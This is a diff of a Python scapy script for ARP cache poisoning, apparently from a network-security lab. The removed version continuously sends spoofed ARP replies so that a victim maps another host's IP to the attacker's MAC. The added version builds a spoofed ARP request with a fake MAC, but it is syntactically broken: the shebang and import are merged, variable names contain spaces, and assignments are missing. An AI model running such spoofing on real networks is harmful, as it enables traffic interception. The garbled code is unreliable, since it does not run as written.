@@ -1,15 +1,16 @@
-#!/usr/bin/env python3
-from scapy.all import *
-
-# Define attacker, victim, and spoofed addresses
-attacker_mac = "02:42:0a:09:00:105"  # Replace with your MAC
-spoofed_ip = "10.9.0.6"              # IP address you want to spoof (e.g., Host B)
-victim_ip = "10.9.0.5"               # Victim's IP address (e.g., Host A)
-
-# Create Ethernet and ARP layers
-E = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast
-A = ARP(op=2, psrc=spoofed_ip, hwsrc=attacker_mac, pdst=victim_ip)  # ARP Reply
-
-# Combine layers and send the packet
-pkt = E / A
-sendp(pkt, loop=1, inter=5)  # Send continuously every 5 seconds
+#!/usr/bin/python3 from scapy.all import *
+VM A IP = "10.0.2.6"
+VM A MAC "08:00:27:84:5e:b9"
+VICTIM IP = "10.0.2.99"
+FAKE MAC = "aa:bb:cc:dd:ee:ff"
+print("SENDING SPOOFED ARP REQUEST......")
+ether Ether()
+ether.dst = VM A MAC
+ether.src = FAKE MAC
+arp = ARP()
+arp.psrc = VICTIM IP
+arp.hwsrc FAKE MAC
+arp.pdst = VM A IP
+arp.op 1
+frame ether/arp
+sendp (frame)
